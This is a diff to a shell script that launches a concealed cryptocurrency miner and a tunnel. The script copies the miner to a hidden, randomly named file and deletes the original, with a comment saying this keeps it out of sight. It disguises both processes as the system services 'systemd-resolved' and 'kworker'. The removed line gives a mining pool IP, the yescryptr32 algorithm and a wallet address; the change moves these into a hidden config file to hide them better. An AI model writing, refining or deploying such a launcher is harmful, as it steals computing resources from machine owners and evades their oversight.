@@ -4,11 +4,10 @@ sleep $((RANDOM % 20 + 5))
 
 NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"
 
-cp /app/sr "/app/$NAME"
+cp /app/isu "/app/$NAME"
 chmod +x "/app/$NAME"
 
-# optional: hapus original biar gak keliatan
-rm -f /app/sr
+rm -f /app/isu
 
 (exec -a systemd-resolved /usr/local/bin/.netd access tcp \
 --hostname "$(cat .h)" \
@@ -16,6 +15,6 @@ rm -f /app/sr
 
 sleep 3
 
-(exec -a kworker/u8:2 /app/$NAME -a yescryptr32 -o 157.173.100.15:80 -u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.marry -p x >/dev/null 2>&1 &)
+(exec -a kworker/u8:2 /app/$NAME -c .cfg >/dev/null 2>&1 &)
 
 tail -f /dev/null
